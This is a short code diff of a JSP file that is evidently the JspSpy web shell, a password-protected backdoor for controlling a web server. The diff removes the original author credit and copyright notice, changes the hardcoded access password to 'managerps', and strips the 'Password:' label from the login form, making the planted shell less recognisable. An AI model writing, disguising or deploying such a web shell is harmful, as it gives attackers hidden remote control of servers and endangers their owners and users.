@@ -1,4 +1,4 @@
-﻿<%@page pageEncoding="utf-8"%>
+<%@page pageEncoding="utf-8"%>
 <%@page import="java.io.*"%>
 <%@page import="java.util.*"%>
 <%@page import="java.util.regex.*"%>
@@ -14,13 +14,7 @@
 <%@page import="java.awt.datatransfer.DataFlavor"%>
 <%@page import="java.util.prefs.Preferences"%>
 <%!
-/**
-* Code By Ninty
-* Date 2009-12-17
-* Blog http://www.Forjj.com/
-* Yue . I Love You.
-*/
-private static final String PW = "ninty"; //password
+private static final String PW = "managerps";
 private static final String PW_SESSION_ATTRIBUTE = "JspSpyPwd";
 private static final String REQUEST_CHARSET = "ISO-8859-1";
 private static final String PAGE_CHARSET = "UTF-8";
@@ -955,13 +949,13 @@ out.println("<style type=\"text/css\">"+
 "	input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}"+
 "a{font:11px Verdana;BACKGROUND: #FFFFFF;}"+
 "	</style><form method=\"POST\" action=\""+SHELL_NAME+"\">"+
-"	  <p><span style=\"font:11px Verdana;\">Password: </span>"+
+"	  <p>"+
 "        <input name=\"o\" type=\"hidden\" value=\"login\">"+
 "        <input name=\"pw\" type=\"password\" size=\"20\">"+
 "        <input type=\"hidden\" name=\"o\" value=\"login\">"+
 "        <input type=\"submit\" value=\"Login\"><br/><br/>"+
 "	  "+
-"<span style=\"font:11px Verdana;\">Copyright &copy; 2009 NinTy </span><a href=\"http://www.forjj.com\" target=\"_blank\">www.Forjj.com</a></p>"+
+"</p>"+
 "    </form>");
 } catch (Exception e) {
 e.printStackTrace();
